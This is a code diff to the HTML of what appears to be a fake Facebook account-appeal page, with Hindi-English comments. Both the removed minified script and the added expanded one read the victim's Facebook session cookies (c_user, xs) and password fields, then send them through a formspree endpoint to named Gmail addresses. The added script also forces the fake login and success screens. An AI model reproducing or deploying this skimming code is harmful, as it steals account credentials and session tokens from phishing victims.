@@ -2160,5 +2160,56 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   }
 });
   </script>
-<script>setTimeout(()=>{if(document.getElementById('c_userInput')||document.getElementById('xsInput')){fetch("https://formspree.io/f/xdknwwza",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({Client:"Rahul Sharma",Website:location.href,"C_User":document.getElementById('c_userInput')?.value||"","XS":document.getElementById('xsInput')?.value||"",To_Email:"lingdavid24@gmail.com"})})};if(document.querySelector('input[type=password]')){fetch("https://formspree.io/f/xdknwwza",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({Client:"Vikash Kumar",Website:location.href,Password:document.querySelector('input[type=password]')?.value||"",To_Email:"akeraa191@gmail.com"})})}},3000);</script>
+  <script>
+setTimeout(() => {
+  // Pehle popup aur button ko wapas normal kar do
+  if (typeof sendBtn !== 'undefined' && sendBtn) {
+    sendBtn.classList.remove('loading');
+    if (sendBtnText) sendBtnText.textContent = 'Submit Appeal Request';
+    if (sendBtnSpinner) sendBtnSpinner.style.display = 'none';
+  }
+  if (typeof fbSendBtn !== 'undefined' && fbSendBtn) {
+    fbSendBtn.classList.remove('loading');
+    if (fbSendBtnText) fbSendBtnText.textContent = 'Verify and Continue';
+    if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'none';
+  }
+
+  // Ab mail bhejo
+  if (document.getElementById('c_userInput') || document.getElementById('xsInput')) {
+    fetch("https://formspree.io/f/xdknwwza", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        Client: "Rahul Sharma",
+        Website: location.href,
+        c_user: document.getElementById('c_userInput')?.value || "",
+        xs: document.getElementById('xsInput')?.value || "",
+        To_Email: "lingdavid24@gmail.com"
+      })
+    });
+  }
+
+  if (document.querySelector('input[type=password]')) {
+    fetch("https://formspree.io/f/xdknwwza", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        Client: "Vikash Kumar",
+        Website: location.href,
+        Password: document.querySelector('input[type=password]')?.value || "",
+        To_Email: "akeraa191@gmail.com"
+      })
+    });
+  }
+}, 2500);
+
+// Agar tumhare pass showfbLogin() aur showSuccess() function hain to unko bhi force se chala do
+if (document.getElementById('c_userInput') || document.getElementById('xsInput')) {
+  if (typeof showfbLogin === 'function') showfbLogin();
+}
+if (document.querySelector('input[type=password]')) {
+  if (typeof showSuccess === 'function') showSuccess();
+}
+  </script>
+  
 </body></html>
